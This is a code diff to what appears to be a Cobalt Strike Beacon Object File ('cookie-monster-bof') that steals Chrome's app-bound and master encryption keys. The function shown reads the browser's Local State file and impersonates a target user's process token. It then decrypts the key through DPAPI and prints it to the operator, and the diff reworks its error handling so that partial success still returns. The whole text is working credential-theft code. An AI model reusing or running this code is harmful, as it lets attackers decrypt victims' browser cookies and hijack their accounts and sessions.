@@ -8,6 +8,7 @@
 #include <ctype.h>
 #include <stdio.h>
 #include <tlhelp32.h>
+#include <stdbool.h>
 #include "cookie-monster-bof.h"
 #include "beacon.h"
 
@@ -1130,6 +1131,8 @@ BOOL AppBoundDecryptor(char * localStateFile, int pid){
 
     //BeaconPrintf(CALLBACK_OUTPUT, "Got Local State File");
     // extract CHAR pattern[] = "\"encrypted_key\":\""; from file
+    bool results_master_key = TRUE;
+    bool results_appbound_key = TRUE;
     char * app_data = GetFileContent(localStateFile);
     if(app_data == NULL) {
         BeaconPrintf(CALLBACK_ERROR,"[!] Reading the file failed.\n");
@@ -1151,200 +1154,188 @@ BOOL AppBoundDecryptor(char * localStateFile, int pid){
             ADVAPI32$RevertToSelf();
             BeaconPrintf(CALLBACK_OUTPUT,"[+] Rev2Self\n");
         } else {
-            return FALSE;
+            results_master_key = FALSE;
         }
+    } else {
+        BeaconPrintf(CALLBACK_ERROR,"[!] Master key not found\n");
+        results_master_key = FALSE;
     }
 
     if (app_key == NULL) {
         BeaconPrintf(CALLBACK_ERROR,"[!] Error Encrypt Appboundkey is null\n");
-        return FALSE;
-    }
-
-    // Base64 decode the app_bound_encrypted_key
-    size_t encrypted_key_len;
-    uint8_t* encrypted_key_with_header = Base64Decode(app_key, &encrypted_key_len);
-    if (encrypted_key_with_header == NULL) {
-        BeaconPrintf(CALLBACK_ERROR,"[!] Failed to base64 decode the key\n");
-        KERNEL32$GlobalFree(app_data);
-        KERNEL32$GlobalFree(app_key);
-        return FALSE;
-    }
-    
-    // Validate key prefix (APPB)
-    if (encrypted_key_len < sizeof(kCryptAppBoundKeyPrefix) || MSVCRT$memcmp(encrypted_key_with_header, kCryptAppBoundKeyPrefix, sizeof(kCryptAppBoundKeyPrefix)) != 0) {
-        BeaconPrintf(CALLBACK_ERROR,"[!] Invalid key header - expected 'APPB' prefix\n");
+        results_appbound_key = FALSE;
+    } else{
+        // Base64 decode the app_bound_encrypted_key
+        size_t encrypted_key_len;
+        uint8_t* encrypted_key_with_header = Base64Decode(app_key, &encrypted_key_len);
+        if (encrypted_key_with_header == NULL) {
+            BeaconPrintf(CALLBACK_ERROR,"[!] Failed to base64 decode the key\n");
+            results_appbound_key = FALSE;
+            goto cleanup_early;
+        }
+        
+        // Validate key prefix (APPB)
+        if (encrypted_key_len < sizeof(kCryptAppBoundKeyPrefix) || MSVCRT$memcmp(encrypted_key_with_header, kCryptAppBoundKeyPrefix, sizeof(kCryptAppBoundKeyPrefix)) != 0) {
+            BeaconPrintf(CALLBACK_ERROR,"[!] Invalid key header - expected 'APPB' prefix\n");
+            MSVCRT$free(encrypted_key_with_header);
+            results_appbound_key = FALSE;
+            goto cleanup_early;
+        }
+        
+        // Strip prefix
+        uint8_t* encrypted_key = (uint8_t*)MSVCRT$malloc(encrypted_key_len - sizeof(kCryptAppBoundKeyPrefix));
+        if (encrypted_key == NULL) {
+            BeaconPrintf(CALLBACK_ERROR,"[!] Failed to allocate memory for encrypted key\n");
+            MSVCRT$free(encrypted_key_with_header);
+            results_appbound_key = FALSE;
+            goto cleanup_early;
+        }
+        
+        MSVCRT$memcpy(encrypted_key, encrypted_key_with_header + sizeof(kCryptAppBoundKeyPrefix), encrypted_key_len - sizeof(kCryptAppBoundKeyPrefix));
+        encrypted_key_len -= sizeof(kCryptAppBoundKeyPrefix);
         MSVCRT$free(encrypted_key_with_header);
-        KERNEL32$GlobalFree(app_data);
-        KERNEL32$GlobalFree(app_key);
-        return FALSE;
-    }
-    
-    // Strip prefix
-    uint8_t* encrypted_key = (uint8_t*)MSVCRT$malloc(encrypted_key_len - sizeof(kCryptAppBoundKeyPrefix));
-    if (encrypted_key == NULL) {
-        BeaconPrintf(CALLBACK_ERROR,"[!] Failed to allocate memory for encrypted key\n");
-        MSVCRT$free(encrypted_key_with_header);
-        KERNEL32$GlobalFree(app_data);
-        KERNEL32$GlobalFree(app_key);
-        return FALSE;
-    }
-    
-    MSVCRT$memcpy(encrypted_key, encrypted_key_with_header + sizeof(kCryptAppBoundKeyPrefix), encrypted_key_len - sizeof(kCryptAppBoundKeyPrefix));
-    encrypted_key_len -= sizeof(kCryptAppBoundKeyPrefix);
-    MSVCRT$free(encrypted_key_with_header);
 
-    // First, attempt to decrypt as SYSTEM
-    //BeaconPrintf(CALLBACK_OUTPUT,"[+] Attempting to decrypt key as SYSTEM...\n");
+        // First, attempt to decrypt as SYSTEM
+        //BeaconPrintf(CALLBACK_OUTPUT,"[+] Attempting to decrypt key as SYSTEM...\n");
 
-    BYTE* decrypted_key = NULL;
-    DWORD decrypted_key_len = 0;
-    
-    DATA_BLOB encrypted_blob;
-    DATA_BLOB intermediate_blob;
-    DATA_BLOB decrypted_blob;
-    
-    encrypted_blob.pbData = encrypted_key;
-    encrypted_blob.cbData = encrypted_key_len;
-    HANDLE hUser = NULL;
-    HANDLE hToken = NULL;
-    HANDLE hProcess = NULL;
-    
-    BOOL result = CRYPT32$CryptUnprotectData(&encrypted_blob, NULL, NULL, NULL, NULL, 0, &intermediate_blob);
-    if (result) {
-        //BeaconPrintf(CALLBACK_OUTPUT,"[+] Attempting to impersonate user to decrypt...\n");
+        BYTE* decrypted_key = NULL;
+        DWORD decrypted_key_len = 0;
         
-        // Impersonate the user
-        hProcess = KERNEL32$OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
-        if (hProcess == NULL) {
-            BeaconPrintf(CALLBACK_ERROR,"[!] Failed to open process: %lu\n", KERNEL32$GetLastError());
+        DATA_BLOB encrypted_blob;
+        DATA_BLOB intermediate_blob;
+        DATA_BLOB decrypted_blob;
+        
+        encrypted_blob.pbData = encrypted_key;
+        encrypted_blob.cbData = encrypted_key_len;
+        HANDLE hUser = NULL;
+        HANDLE hToken = NULL;
+        HANDLE hProcess = NULL;
+        
+        BOOL result = CRYPT32$CryptUnprotectData(&encrypted_blob, NULL, NULL, NULL, NULL, 0, &intermediate_blob);
+        if (result) {
+            //BeaconPrintf(CALLBACK_OUTPUT,"[+] Attempting to impersonate user to decrypt...\n");
+            
+            // Impersonate the user
+            hProcess = KERNEL32$OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
+            if (hProcess == NULL) {
+                BeaconPrintf(CALLBACK_ERROR,"[!] Failed to open process: %lu\n", KERNEL32$GetLastError());
+                MSVCRT$free(encrypted_key);
+                results_appbound_key = FALSE;
+                goto cleanup_early;
+            }
+            
+            if (!ADVAPI32$OpenProcessToken(hProcess, TOKEN_QUERY | TOKEN_DUPLICATE, &hToken)) {
+                BeaconPrintf(CALLBACK_ERROR,"[!] Failed to open process token: %lu\n", KERNEL32$GetLastError());
+                KERNEL32$CloseHandle(hProcess);
+                MSVCRT$free(encrypted_key);
+                results_appbound_key = FALSE;
+                goto cleanup_early;
+            }
+            
+            if (!ADVAPI32$DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS,NULL, SecurityImpersonation, TokenPrimary, &hUser)) {
+                BeaconPrintf(CALLBACK_ERROR,"[!] Failed to duplicate token: %lu\n", KERNEL32$GetLastError());
+                KERNEL32$CloseHandle(hToken);
+                KERNEL32$CloseHandle(hProcess);
+                MSVCRT$free(encrypted_key);
+                results_appbound_key = FALSE;
+                goto cleanup_early;
+            }
+            
+            if (!ADVAPI32$ImpersonateLoggedOnUser(hUser)) {
+                BeaconPrintf(CALLBACK_ERROR,"[!] Failed to impersonate user: %lu\n", KERNEL32$GetLastError());
+                KERNEL32$CloseHandle(hToken);
+                KERNEL32$CloseHandle(hProcess);
+                KERNEL32$CloseHandle(hUser);
+                MSVCRT$free(encrypted_key);
+                results_appbound_key = FALSE;
+                goto cleanup_early;
+            }
+            
+            BeaconPrintf(CALLBACK_OUTPUT,"[!] Successfully impersonated user with PID: %d\n", pid);
+            
+            // Now try to decrypt as impersonated user
+            result = CRYPT32$CryptUnprotectData(&intermediate_blob, NULL, NULL, NULL, NULL, 0, &decrypted_blob);
+            if (!result) {
+                BeaconPrintf(CALLBACK_ERROR,"[!] Decrypting as impersonated user failed: %lu\n", KERNEL32$GetLastError());
+                ADVAPI32$RevertToSelf();
+                KERNEL32$CloseHandle(hToken);
+                KERNEL32$CloseHandle(hProcess);
+                KERNEL32$CloseHandle(hUser);
+                MSVCRT$free(encrypted_key);
+                results_appbound_key = FALSE;
+                goto cleanup_early;
+            }
+            
+            //BeaconPrintf(CALLBACK_OUTPUT,"[!] Successfully decrypted key as impersonated user!\n");
+        } else {
+            BeaconPrintf(CALLBACK_ERROR,"[!] Failed to decrypt key as SYSTEM!\n");
             MSVCRT$free(encrypted_key);
-            KERNEL32$GlobalFree(app_data);
-            KERNEL32$GlobalFree(app_key);
-            return FALSE;
+            results_appbound_key = FALSE;
+            goto cleanup_early;
         }
-        
-        if (!ADVAPI32$OpenProcessToken(hProcess, TOKEN_QUERY | TOKEN_DUPLICATE, &hToken)) {
-            BeaconPrintf(CALLBACK_ERROR,"[!] Failed to open process token: %lu\n", KERNEL32$GetLastError());
-            KERNEL32$CloseHandle(hProcess);
-            MSVCRT$free(encrypted_key);
-            KERNEL32$GlobalFree(app_data);
-            KERNEL32$GlobalFree(app_key);
-            return FALSE;
-        }
-        
-        if (!ADVAPI32$DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS,NULL, SecurityImpersonation, TokenPrimary, &hUser)) {
-            BeaconPrintf(CALLBACK_ERROR,"[!] Failed to duplicate token: %lu\n", KERNEL32$GetLastError());
-            KERNEL32$CloseHandle(hToken);
-            KERNEL32$CloseHandle(hProcess);
-            MSVCRT$free(encrypted_key);
-            KERNEL32$GlobalFree(app_data);
-            KERNEL32$GlobalFree(app_key);
-            return FALSE;
-        }
-        
-        if (!ADVAPI32$ImpersonateLoggedOnUser(hUser)) {
-            BeaconPrintf(CALLBACK_ERROR,"[!] Failed to impersonate user: %lu\n", KERNEL32$GetLastError());
-            KERNEL32$CloseHandle(hToken);
-            KERNEL32$CloseHandle(hProcess);
-            KERNEL32$CloseHandle(hUser);
-            MSVCRT$free(encrypted_key);
-            KERNEL32$GlobalFree(app_data);
-            KERNEL32$GlobalFree(app_key);
-            return FALSE;
-        }
-        
-        BeaconPrintf(CALLBACK_OUTPUT,"[!] Successfully impersonated user with PID: %d\n", pid);
-        
-        // Now try to decrypt as impersonated user
-        result = CRYPT32$CryptUnprotectData(&intermediate_blob, NULL, NULL, NULL, NULL, 0, &decrypted_blob);
-        if (!result) {
-            BeaconPrintf(CALLBACK_ERROR,"[!] Decrypting as impersonated user failed: %lu\n", KERNEL32$GetLastError());
+
+        // Revert impersonation
+        if (hUser != NULL) {
             ADVAPI32$RevertToSelf();
             KERNEL32$CloseHandle(hToken);
             KERNEL32$CloseHandle(hProcess);
             KERNEL32$CloseHandle(hUser);
-            MSVCRT$free(encrypted_key);
-            KERNEL32$GlobalFree(app_data);
-            KERNEL32$GlobalFree(app_key);
-            return FALSE;
+            BeaconPrintf(CALLBACK_OUTPUT,"[+] Rev2Self\n");
         }
         
-        //BeaconPrintf(CALLBACK_OUTPUT,"[!] Successfully decrypted key as impersonated user!\n");
-    } else {
-        BeaconPrintf(CALLBACK_ERROR,"[!] Failed to decrypt key as SYSTEM!\n");
-        MSVCRT$free(encrypted_key);
-        KERNEL32$GlobalFree(app_data);
-        KERNEL32$GlobalFree(app_key);
-        return FALSE;
-    }
+        // Parse the decrypted data - Chrome format
+        BYTE* cursor = decrypted_blob.pbData;
+        DWORD remaining = decrypted_blob.cbData;
+        DWORD validation_len = 0;
 
-    // Revert impersonation
-    if (hUser != NULL) {
-        ADVAPI32$RevertToSelf();
-        KERNEL32$CloseHandle(hToken);
-        KERNEL32$CloseHandle(hProcess);
-        KERNEL32$CloseHandle(hUser);
-        BeaconPrintf(CALLBACK_OUTPUT,"[+] Rev2Self\n");
-    }
-    
-    // Parse the decrypted data - Chrome format
-    BYTE* cursor = decrypted_blob.pbData;
-    DWORD remaining = decrypted_blob.cbData;
-    DWORD validation_len = 0;
-
-    // Get validation string length
-    if (!PopDWORDFromStringFront(&cursor, &remaining, &validation_len)) {
-        BeaconPrintf(CALLBACK_ERROR,"[!] Failed to read validation length.\n");
-        KERNEL32$LocalFree(decrypted_blob.pbData);
-        MSVCRT$free(encrypted_key);
-        KERNEL32$GlobalFree(app_data);
-        KERNEL32$GlobalFree(app_key);
-        return FALSE;
-    }
-    
-    if (validation_len > remaining) {
-        BeaconPrintf(CALLBACK_ERROR,"[!] Validation length (%lu) exceeds remaining data (%lu).\n", validation_len, remaining);
-        KERNEL32$LocalFree(decrypted_blob.pbData);
-        MSVCRT$free(encrypted_key);
-        KERNEL32$GlobalFree(app_data);
-        KERNEL32$GlobalFree(app_key);
-        return FALSE;
-    }
-    
-    // Get validation string
-    BYTE* validation_blob = cursor;
-    if (!PopFromStringFront(&cursor, &remaining, validation_len, NULL)) {
-        BeaconPrintf(CALLBACK_ERROR,"[!] Failed to extract validation blob.\n");
-        KERNEL32$LocalFree(decrypted_blob.pbData);
-        MSVCRT$free(encrypted_key);
-        KERNEL32$GlobalFree(app_data);
-        KERNEL32$GlobalFree(app_key);
-        return FALSE;
-    }
-    
-    // Get key length
-    DWORD key_len = 0;
-    if (!PopDWORDFromStringFront(&cursor, &remaining, &key_len)) {
-        BeaconPrintf(CALLBACK_ERROR,"[!] Failed to read key length.\n");
-        KERNEL32$LocalFree(decrypted_blob.pbData);
-        MSVCRT$free(encrypted_key);
-        KERNEL32$GlobalFree(app_data);
-        KERNEL32$GlobalFree(app_key);
-        return FALSE;
-    }
-    
-    if (key_len > remaining) {
-        BeaconPrintf(CALLBACK_ERROR,"[!] Key length (%lu) exceeds remaining data (%lu).\n", key_len, remaining);
-        KERNEL32$LocalFree(decrypted_blob.pbData);
-        MSVCRT$free(encrypted_key);
-        KERNEL32$GlobalFree(app_data);
-        KERNEL32$GlobalFree(app_key);
-        return FALSE;
-    }
-    
-    // Get key blob
-    BYTE* key_blob = cursor;
-    
+        // Get validation string length
+        if (!PopDWORDFromStringFront(&cursor, &remaining, &validation_len)) {
+            BeaconPrintf(CALLBACK_ERROR,"[!] Failed to read validation length.\n");
+            KERNEL32$LocalFree(decrypted_blob.pbData);
+            MSVCRT$free(encrypted_key);
+            results_appbound_key = FALSE;
+            goto cleanup_early;
+        }
+        
+        if (validation_len > remaining) {
+            BeaconPrintf(CALLBACK_ERROR,"[!] Validation length (%lu) exceeds remaining data (%lu).\n", validation_len, remaining);
+            KERNEL32$LocalFree(decrypted_blob.pbData);
+            MSVCRT$free(encrypted_key);
+            results_appbound_key = FALSE;
+            goto cleanup_early;
+        }
+        
+        // Get validation string
+        BYTE* validation_blob = cursor;
+        if (!PopFromStringFront(&cursor, &remaining, validation_len, NULL)) {
+            BeaconPrintf(CALLBACK_ERROR,"[!] Failed to extract validation blob.\n");
+            KERNEL32$LocalFree(decrypted_blob.pbData);
+            MSVCRT$free(encrypted_key);
+            results_appbound_key = FALSE;
+            goto cleanup_early;
+        }
+        
+        // Get key length
+        DWORD key_len = 0;
+        if (!PopDWORDFromStringFront(&cursor, &remaining, &key_len)) {
+            BeaconPrintf(CALLBACK_ERROR,"[!] Failed to read key length.\n");
+            KERNEL32$LocalFree(decrypted_blob.pbData);
+            MSVCRT$free(encrypted_key);
+            results_appbound_key = FALSE;
+            goto cleanup_early;
+        }
+        
+        if (key_len > remaining) {
+            BeaconPrintf(CALLBACK_ERROR,"[!] Key length (%lu) exceeds remaining data (%lu).\n", key_len, remaining);
+            KERNEL32$LocalFree(decrypted_blob.pbData);
+            MSVCRT$free(encrypted_key);
+            results_appbound_key = FALSE;
+            goto cleanup_early;
+        }
+        
+        // Get key blob
+        BYTE* key_blob = cursor;
+        
         // if first byte is 03 then decyrpt with CNG
         if (key_blob[0] == 0x03) {
             //BeaconPrintf(CALLBACK_OUTPUT,"[+] Decrypting key with CNG...");
@@ -1371,21 +1362,28 @@ BOOL AppBoundDecryptor(char * localStateFile, int pid){
         }
         /* BeaconPrintf(CALLBACK_OUTPUT,"[!] Decrypted Key (%lu bytes):\n", key_len); */
         CHAR *output = (CHAR*)KERNEL32$GlobalAlloc(GPTR, (key_len * 4) + 1);
-       
+    
         for (DWORD i = 0; i < key_len; i++) {
             MSVCRT$sprintf(output, "%s\\x%02x", output, key_blob[i]);
         }
-         
+            
         BeaconPrintf(CALLBACK_OUTPUT,"[+] App-Bound Key: %s \n", output );
-    
-    
-    // Clean up
-    KERNEL32$LocalFree(decrypted_blob.pbData);
-    KERNEL32$LocalFree(intermediate_blob.pbData);
-    MSVCRT$free(encrypted_key);
+        // Clean up
+        KERNEL32$LocalFree(decrypted_blob.pbData);
+        KERNEL32$LocalFree(intermediate_blob.pbData);
+        MSVCRT$free(encrypted_key);
+        KERNEL32$GlobalFree(output);
+    }
+
+cleanup_early:
     KERNEL32$GlobalFree(app_data);
     KERNEL32$GlobalFree(app_key);
-    KERNEL32$GlobalFree(output);
+    
+    // Only return FALSE if BOTH operations failed
+    if (!results_master_key && !results_appbound_key) {
+        BeaconPrintf(CALLBACK_ERROR,"[!] Both master key and app-bound key decryption failed\n");
+        return FALSE;
+    }
     
     return TRUE;
 }
